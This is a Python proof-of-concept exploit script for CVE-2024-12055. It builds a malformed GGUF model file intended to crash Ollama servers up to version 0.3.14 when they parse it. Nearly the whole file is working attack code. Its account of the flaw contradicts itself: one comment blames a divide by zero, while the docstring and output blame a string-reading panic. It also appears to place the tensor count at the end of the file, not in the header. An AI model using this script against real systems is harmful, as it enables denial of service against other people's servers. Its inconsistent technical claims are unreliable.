#!/usr/bin/env python3
"""
CVE-2024-12055 PoC - Create malformed GGUF triggering crash in gguf.go
Triggers panic in readGGUFString (makeslice: len out of range) when Ollama parses.
Reference: https://huntr.com/bounties/7b111d55-8215-4727-8807-c5ed4cf1bfbe
"""
import struct
import sys

# GGUF magic and version
GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

# Metadata value types
GGUF_TYPE_UINT32 = 4
GGUF_TYPE_INT32 = 5
GGUF_TYPE_STRING = 8
GGUF_TYPE_ARRAY = 9
GGUF_TYPE_FLOAT32 = 6


def write_metadata_key_value(f, key: str, value_type: int, value):
    """Write a metadata key-value pair."""
    key_bytes = key.encode("utf-8")
    f.write(struct.pack("<Q", len(key_bytes)))
    f.write(key_bytes)
    f.write(struct.pack("<I", value_type))
    if value_type == GGUF_TYPE_UINT32:
        f.write(struct.pack("<I", value))
    elif value_type == GGUF_TYPE_STRING:
        val_bytes = value.encode("utf-8")
        f.write(struct.pack("<Q", len(val_bytes)))
        f.write(val_bytes)
    elif value_type == GGUF_TYPE_INT32:
        f.write(struct.pack("<i", value))
    elif value_type == GGUF_TYPE_FLOAT32:
        f.write(struct.pack("<f", value))
    elif value_type == GGUF_TYPE_ARRAY:
        f.write(struct.pack("<I", value[0]))
        f.write(struct.pack("<Q", len(value[1])))
        for v in value[1]:
            if value[0] == GGUF_TYPE_STRING:
                vb = v.encode("utf-8")
                f.write(struct.pack("<Q", len(vb)))
                f.write(vb)
            elif value[0] == GGUF_TYPE_FLOAT32:
                f.write(struct.pack("<f", v))
            elif value[0] == GGUF_TYPE_INT32:
                f.write(struct.pack("<i", v))


def create_malicious_gguf(output_path: str):
    with open(output_path, "wb") as f:
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))

        metadata = [
            ("general.architecture", GGUF_TYPE_STRING, "llama"),
            ("general.file_type", GGUF_TYPE_UINT32, 2),
            ("general.quantization_version", GGUF_TYPE_UINT32, 2),
            ("general.alignment", GGUF_TYPE_UINT32, 0),  # Triggers divide by zero
            ("llama.context_length", GGUF_TYPE_UINT32, 512),
            ("llama.embedding_length", GGUF_TYPE_UINT32, 256),
            ("llama.block_count", GGUF_TYPE_UINT32, 1),
            ("llama.attention.head_count", GGUF_TYPE_UINT32, 4),
            ("llama.attention.head_count_kv", GGUF_TYPE_UINT32, 4),
            ("llama.rope.dimension_count", GGUF_TYPE_UINT32, 64),
            ("llama.feed_forward_length", GGUF_TYPE_UINT32, 256),
            ("tokenizer.ggml.model", GGUF_TYPE_STRING, "gpt2"),
            ("tokenizer.ggml.tokens", GGUF_TYPE_ARRAY, (GGUF_TYPE_STRING, ["<unk>", "<s>", "</s>"])),
            ("tokenizer.ggml.scores", GGUF_TYPE_ARRAY, (GGUF_TYPE_FLOAT32, [0.0, 0.0, 0.0])),
            ("tokenizer.ggml.token_type", GGUF_TYPE_ARRAY, (GGUF_TYPE_INT32, [1, 2, 2])),
            ("tokenizer.ggml.bos_token_id", GGUF_TYPE_INT32, 1),
            ("tokenizer.ggml.eos_token_id", GGUF_TYPE_INT32, 2),
            ("tokenizer.ggml.padding_token_id", GGUF_TYPE_INT32, 0),
        ]

        f.write(struct.pack("<Q", len(metadata)))
        for key, vtype, val in metadata:
            write_metadata_key_value(f, key, vtype, val)

        f.write(struct.pack("<Q", 0))  # tensor_count = 0

    print(f"Created malicious GGUF: {output_path}")
    print("  general.alignment=0 triggers panic in readGGUFString (crashes Ollama <= 0.3.14)")


if __name__ == "__main__":
    output = sys.argv[1] if len(sys.argv) > 1 else "malicious.gguf"
    create_malicious_gguf(output)
